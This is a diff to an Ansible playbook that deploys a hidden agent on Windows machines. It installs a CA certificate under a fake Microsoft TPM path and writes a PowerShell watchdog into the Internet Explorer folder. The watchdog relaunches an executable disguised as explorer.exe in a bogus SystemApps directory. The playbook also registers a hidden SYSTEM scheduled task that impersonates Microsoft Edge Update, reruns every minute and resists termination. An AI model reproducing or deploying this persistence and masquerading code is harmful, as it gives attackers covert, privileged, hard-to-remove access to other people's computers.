@@ -19,21 +19,114 @@
     src: "snakeeyes-ca.crt"
     dest: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\Microsoft_TPM_Network_DSA_Trust.crt"
 
-- name: Create scheduled task
-  community.windows.win_scheduled_task:
-    name: MicrosoftEdgeUpdateTaskMachineEN
-    description: Keeps your Microsoft software up to date. if this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.
-    actions:
-      - path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"
-    triggers:
-      - type: boot
-    username: SYSTEM
-    run_level: highest
-    state: present
-    enabled: true
+- name: Deploy watchdog PowerShell script
+  ansible.windows.win_copy:
+    dest: "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
+    content: |
+      $exePath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\explorer.exe'
+      $logPath = 'C:\Windows\SystemApps\Microsoft.Windows.FileExplorer_xyw5h1lvcb\Testing.log'
 
-- name: Start agent immediately
-  ansible.windows.win_shell: |
-    Start-Process -FilePath "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe" -WindowStyle Hidden
-  args:
-    executable: powershell.exe
+      function Write-Log {
+          param([string]$Message)
+          $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+          Add-Content -Path $logPath -Value "$ts - $Message"
+      }
+
+      Write-Log "Watchdog started."
+
+      if (-not (Test-Path $exePath)) {
+          Write-Log "ERROR: EXE not found."
+          exit 1
+      }
+
+      $running = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }
+
+      if ($running) {
+          Write-Log "Process already running."
+          exit 0
+      }
+
+      try {
+          Write-Log "Process not running. Starting it now."
+          Start-Process -FilePath $exePath
+          Start-Sleep -Seconds 5
+
+          $runningAfter = Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq $exePath }
+
+          if ($runningAfter) {
+              Write-Log "Process started successfully."
+              exit 0
+          }
+          else {
+              Write-Log "ERROR: Start attempted but process not found afterward."
+              exit 2
+          }
+      }
+      catch {
+          Write-Log "ERROR: $($_.Exception.Message)"
+          exit 3
+      }
+
+- name: Create scheduled task for watchdog
+  ansible.windows.win_powershell:
+    script: |
+      $taskName   = 'MicrosoftEdgeUpdateTaskMachineEN'
+      $scriptPath = 'C:\Program Files\Internet Explorer\MicrosoftEdgeUpdate.ps1'
+
+      $action = New-ScheduledTaskAction `
+        -Execute 'powershell.exe' `
+        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+
+      $triggerStartup = New-ScheduledTaskTrigger -AtStartup
+      $triggerLogon   = New-ScheduledTaskTrigger -AtLogOn
+
+      # Dailey trigger gets made first
+      $triggerRepeat = New-ScheduledTaskTrigger -Daily -At 12:00AM
+ 
+      $principal = New-ScheduledTaskPrincipal `
+        -UserId 'SYSTEM' `
+        -LogonType ServiceAccount `
+        -RunLevel Highest
+
+      $settings = New-ScheduledTaskSettingsSet `
+        -AllowStartIfOnBatteries `
+        -DontStopIfGoingOnBatteries `
+        -StartWhenAvailable `
+        -Hidden `
+        -ExecutionTimeLimit (New-TimeSpan -Seconds 0)
+
+      # Do not start a new instance if one is already running
+      $settings.MultipleInstances = 2
+
+      Register-ScheduledTask `
+        -TaskName $taskName `
+        -Description 'Keeps your Microsoft software up to date. if this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.' `
+        -Action $action `
+        -Trigger @($triggerStartup, $triggerLogon, $triggerRepeat) `
+        -Principal $principal `
+        -Settings $settings `
+        -Force
+
+      # Now re-open the registered task and directly edit the repetition properties
+      $task = Get-ScheduledTask -TaskName $taskName
+
+      foreach ($t in $task.Triggers) {
+          if ($t.TriggerType -eq 'Daily') {
+              $t.Repetition.Interval = 'PT1M'
+              $t.Repetition.Duration = 'P1D'
+              $t.Repetition.StopAtDurationEnd = $false
+          }
+      }
+
+      # Also force the settings you wanted
+      $task.Settings.Hidden = $true
+      $task.Settings.ExecutionTimeLimit = 'PT0S'
+      $task.Settings.AllowHardTerminate = $false
+      $task.Settings.MultipleInstances = 'IgnoreNew'
+
+      Set-ScheduledTask -InputObject $task
+
+- name: Run watchdog once immediately
+  ansible.windows.win_powershell:
+    script: |
+      Start-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskMachineEN'
